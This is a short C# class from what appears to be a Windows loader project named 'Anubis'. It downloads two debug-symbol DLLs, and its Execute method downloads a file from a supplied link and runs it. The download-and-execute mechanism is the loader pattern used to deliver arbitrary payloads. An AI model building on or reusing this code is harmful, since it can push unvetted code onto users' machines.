using Anubis.System;
using Anubis.System.Attributes;
using Anubis.Win32.Loader.Environment.Behaviours;

using Sys = System;

namespace Anubis.Win32.Loader.Environment
{
    [RequiredBehaviour(typeof(DownloadBehaviour))]
    [RequiredBehaviour(typeof(ExecuteBehaviour))]
    public class EnvExObject : ExObject
    {
        public bool Prepare()
            => GetComponent<DownloadBehaviour>().DownloadFromStorage( new string[] { "msdia140.dll", "symsrv.dll" } );

        public bool Execute(string link)
        {
            if(GetComponent<DownloadBehaviour>().DownloadFromLink(link, out string path))
            {
                return GetComponent<ExecuteBehaviour>().Run( path );
            }

            return false;
        }

        public void Shutdown()
        {
            //Clear();

            Sys.Environment.Exit( 0 );
        }
    }
}
